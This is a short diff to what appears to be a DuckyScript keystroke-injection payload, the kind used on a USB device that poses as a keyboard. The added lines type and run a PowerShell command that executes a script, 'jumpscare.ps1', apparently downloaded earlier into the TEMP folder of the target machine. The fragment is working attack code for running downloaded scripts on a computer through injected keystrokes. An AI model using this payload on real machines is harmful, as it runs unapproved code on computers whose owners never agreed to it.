@@ -15,3 +15,7 @@ DELAY 8000
 STRING Test-Path "$env:TEMP\jumpscare.ps1"
 ENTER
 DELAY 2000
+
+REM Ejecutar el script descargado
+STRING & "$env:TEMP\jumpscare.ps1"
+ENTER
